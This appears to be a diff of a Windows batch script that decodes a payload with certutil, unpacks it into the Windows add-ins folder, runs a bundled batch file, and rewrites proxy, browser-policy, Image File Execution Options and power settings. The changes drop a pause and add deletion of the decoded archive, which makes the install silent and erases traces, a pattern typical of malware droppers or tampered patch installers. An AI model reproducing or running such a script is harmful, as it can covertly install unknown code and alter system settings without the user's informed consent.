@@ -12,7 +12,6 @@ certutil.exe -decode Procx.64 Procx.cab
 expand Procx.cab -F:*.* %windir%\addins
 start ProcX86-64.bat
 explorer.exe %windir%\addins
-pause
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 0x00000000 /f
 reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel" /v HomePage /t REG_DWORD /d 0x00000001 /f
 reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Main" /v "Start Page" /t REG_SZ /d "about:blank" /f
@@ -39,6 +38,7 @@ Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Start_TrackDocs" /t REG_DWORD /d "1" /f
 Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Start_TrackDocs" /t REG_DWORD /d "0" /f
 del /f /q Procx.64
+del /f /q Procx.cab
 powercfg -x -standby-timeout-dc 0&powercfg -x -standby-timeout-ac 0& powercfg -x -hibernate-timeout-ac 0& powercfg -x -hibernate-timeout-dc 0
 del /f /q %windir%\nla.bat
 del /f /q %windir%\tspatch.exe
